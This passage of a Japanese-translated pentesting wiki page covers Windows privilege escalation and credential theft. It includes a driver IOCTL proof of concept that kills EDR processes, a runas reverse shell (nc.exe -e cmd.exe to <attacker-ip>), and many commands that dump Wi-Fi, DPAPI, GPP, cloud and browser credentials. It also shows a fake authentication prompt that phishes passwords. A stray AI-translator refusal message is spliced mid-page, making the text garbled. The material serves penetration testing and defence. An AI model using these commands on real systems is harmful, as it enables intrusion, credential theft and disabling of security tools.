Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 起動時に実行

**別のユーザーによって実行される registry や binary を上書きできるか確認する。**\
**参照**して、**次のページ**で興味深い **autoruns locations to escalate privileges** について詳しく学んでください:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバ

可能性のある**サードパーティ製の怪しい/脆弱な**ドライバを探す
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバが arbitrary kernel read/write primitive を公開している場合（設計の不十分な IOCTL ハンドラでよくある）、カーネルメモリから直接 SYSTEM トークンを奪取して権限昇格できます。ステップバイステップの手法は以下を参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な呼び出しが攻撃者制御下の Object Manager パスを開くようなレースコンディションバグでは、検索を意図的に遅くする（最大長コンポーネントや深いディレクトリチェーンを使用する）ことで、ウィンドウをマイクロ秒単位から数十マイクロ秒にまで伸ばせます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### レジストリハイブのメモリ破損プリミティブ

最近のハイブ脆弱性では、決定論的なレイアウトを整え、書き込み可能な HKLM/HKU の子孫を悪用し、メタデータ破損をカスタムドライバ無しで kernel paged-pool overflows に変換できます。フルチェーンは以下を参照してください：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### デバイスオブジェクトで FILE_DEVICE_SECURE_OPEN が欠落していることの悪用（LPE + EDR kill）

一部の署名されたサードパーティドライバは、IoCreateDeviceSecure を使って強力な SDDL で device object を作成しますが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れることがあります。このフラグがないと、余分なコンポーネントを含むパス経由でデバイスが開かれた場合に secure DACL が適用されず、権限のないユーザでも次のような namespace path を使ってハンドルを取得できます：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile （実際の事例から）

ユーザがデバイスを開けるようになると、ドライバが公開する特権付き IOCTLs を LPE や改ざんに悪用できます。実際に確認された機能例：
- 任意のプロセスに対してフルアクセスのハンドルを返す（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 制限のない raw disk の読み書き（オフライン改ざん、ブート時永続化トリック）。
- Protected Process/Light (PP/PPL) を含む任意のプロセスを終了させることができ、これによりカーネル経由で user land から AV/EDR を停止（kill）できます。

最小限の PoC パターン（user mode）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACLで制限することを想定したデバイスオブジェクトを作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定してください。
- 特権操作では呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に PP/PPL チェックを追加してください。
- IOCTLs（access masks、METHOD_*、input validation）を制限し、直接カーネル権限を与える代わりに brokered models の検討を行ってください。

防御者向けの検出アイデア
- 不審なデバイス名（例: \\ .\\amsdk*）への user-mode のオープンや、悪用を示す特定の IOCTL シーケンスを監視してください。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の許可/拒否リストを維持してください。


## PATH DLL Hijacking

もし **PATH上に存在するフォルダ内に書き込み権限がある** と、プロセスがロードする DLL をハイジャックして **権限昇格** できる可能性があります。

PATH内のすべてのフォルダの権限を確認してください：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックの悪用方法の詳細については:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコーディングされた他の既知のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**restricted services**がないか確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**このページでファイアウォール関連のコマンドを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルール一覧、ルール作成、無効化、無効化...）**

さらに[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
`bash.exe` バイナリは `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも存在します。

rootユーザーを取得すると任意のポートでリッスンできます（ポートで `nc.exe` を使ってリッスンするのが初めての場合、GUIで `nc` をファイアウォールで許可するかどうかを尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
To easily start bash as root, you can try `--default-user root`

bash を root として簡単に起動するには、`--default-user root` を試してください

You can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

次のフォルダで `WSL` ファイルシステムを参照できます: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows 認証情報

### Winlogon 認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャー / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、サーバー、ウェブサイト、そして **Windows** が **ユーザーを自動的にログインさせることができる** その他のプログラム向けのユーザー資格情報を保存します。 一見すると、ユーザーが Facebook、Twitter、Gmail などの資格情報を保存してブラウザで自動的にログインできるように見えるかもしれません。しかし、そうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるために使用できる資格情報を保存します。つまり、リソース（サーバーやウェブサイト）にアクセスするために資格情報を必要とする任意の **Windows application that needs credentials to access a resource** が、この **Credential Manager** と Windows Vault を利用して、保存された資格情報を使用でき、ユーザーが毎回ユーザー名とパスワードを入力する必要がなくなるということです。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの資格情報を使用することはできないと思われます。したがって、あなたのアプリケーションが vault を利用したい場合は、デフォルトのストレージ vault からそのリソースの資格情報を取得するために、何らかの方法で **credential manager と通信してそのリソースの資格情報を要求する** 必要があります。

マシンに保存されている資格情報を一覧表示するには `cmdkey` を使用します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために`runas`を`/savecred`オプションと共に使用できます。以下の例はSMB共有経由でリモートバイナリを呼び出す例です。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された一連の credential を使って `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意: mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The **Data Protection API (DPAPI)** は、データの対称暗号化の方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵を対称的に暗号化するために使用されます。この暗号化は、エントロピーに大きく寄与するユーザーまたはシステムのシークレットを利用します。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。システム暗号化のシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPI を使用して暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに格納されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file** は通常 64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧できませんが、PowerShell では一覧できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使い、これを復号できます。

**マスターパスワードで保護された認証情報ファイル** は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を指定して、**mimikatz module** `dpapi::cred` を使用して復号できます。\
root の場合、`sekurlsa::dpapi` module を使用して **memory** から多くの **DPAPI** **masterkeys** を抽出できます。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell の資格情報

**PowerShell credentials** は暗号化された資格情報を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。これらの資格情報は **DPAPI** によって保護されており、通常、作成されたのと同じユーザーが同じコンピュータ上でのみ復号できます。

ファイルに含まれる PS credentials を **復号** するには、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### ワイファイ
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

次の場所で見つけることができます `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ 
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
適切な `/masterkey` を指定して、**Mimikatz** の `dpapi::rdg` モジュールを使うと、**任意の .rdg ファイルを復号**できます。\
メモリから多数の DPAPI masterkeys を **抽出** するには、Mimikatz の `sekurlsa::dpapi` モジュールを使用できます。

### Sticky Notes

人々はしばしば Windows ワークステーション上で StickyNotes アプリを使って**パスワードを保存**したりその他の情報を残したりしますが、それがデータベースファイルであることに気付いていないことが多いです。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe からパスワードを回復するには Administrator 権限が必要で、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、いくつかの **資格情報** が設定されていて **回復** できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認する。\
インストーラーは**run with SYSTEM privileges**で実行されます。多くは**DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**に脆弱です。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルと Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSHのプライベートキーはレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されていることがあるため、そこに興味深いものがないか確認してください：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリを見つけた場合、それはおそらく保存された SSH key です。暗号化された状態で保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使うと簡単に復号できます。\
この手法の詳しい情報はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし `ssh-agent` サービスが実行されておらず、起動時に自動で開始させたい場合は、次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもはや有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` で追加して、ssh でマシンにログインして試しました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称鍵認証中に `dpapi.dll` の使用を特定しませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは **metasploit** を使用して検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** というファイルを検索する

### Cached GPP パスワード

以前、Group Policy Preferences (GPP) を使って複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は任意のドメインユーザーがアクセスできました。次に、これらの GPP 内のパスワードは、公開された既定キーを使って AES256 で暗号化されていましたが、認証済みユーザーであれば復号できてしまいました。これにより、ユーザーが特権を昇格させるリスクが生じていました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルをスキャンし、"cpassword" フィールドが空でないファイルを検出する関数が作成されました。該当ファイルを見つけると、その関数はパスワードを復号し、カスタム PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれ、脆弱性の特定と修復に役立ちます。

次の場所でこれらのファイルを検索してください: `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（Windows Vista より前）_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使って passwords を取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 設定
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN の認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を尋ねる

常に**ユーザーに自分の credentials、あるいは別のユーザーの credentials を入力するよう頼むことができます**（ただし、クライアントに直接**尋ねる**ことで**credentials**を求めるのは非常に**危険**であることに注意してください）:
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **資格情報を含む可能性のあるファイル名**

以前、**passwords**が**clear-text**または**Base64**で保存されていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository or files. Please either:

- Paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or any other files) here, or  
- Provide a list of the specific files you want searched/translated, or  
- Grant access to the repo (or a way to fetch files).

Once you provide the file contents or list, I will translate the relevant English text to Japanese following your markdown/tag rules.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBinの資格情報

Binも確認して、その中に資格情報がないか探してください

複数のプログラムに保存された**パスワードを復元**するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含むその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**Chrome or Firefox** のパスワードが保存されているDBを確認してください。\  
また、ブラウザの履歴、ブックマーク、 お気に入りも確認し、そこに**パスワードが**保存されている可能性を調べてください。

ブラウザからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) は、Windows オペレーティングシステムに組み込まれた技術で、異なる言語のソフトウェアコンポーネント間の相互通信を可能にします。各 COM コンポーネントは class ID (CLSID) によって識別され、それぞれが 1 つ以上のインターフェースを通じて機能を公開し、そのインターフェースは interface ID (IIDs) によって識別されます。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** および **HKEY\CLASSES\ROOT\Interface** に定義されています。 このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** と **HKEY\CURRENT\USER\Software\Classes** をマージして作成され、結果が **HKEY\CLASSES\ROOT** になります。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本的に、実行される DLL のいずれかを上書きできれば、その DLL が異なるユーザーによって実行される場合に**権限昇格**が可能になります。

攻撃者が COM Hijacking を persistence mechanism としてどのように使用するかを学ぶには、以下を参照してください:

{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の汎用パスワード検索**

**ファイル内容の検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインです。私はこのプラグインを作成し、被害者の環境内で credentials を検索するすべての metasploit POST module を自動的に実行するようにしています。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページで言及された passwords を含むすべてのファイルを自動で検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムから password を抽出するもう一つの優れたツールです。

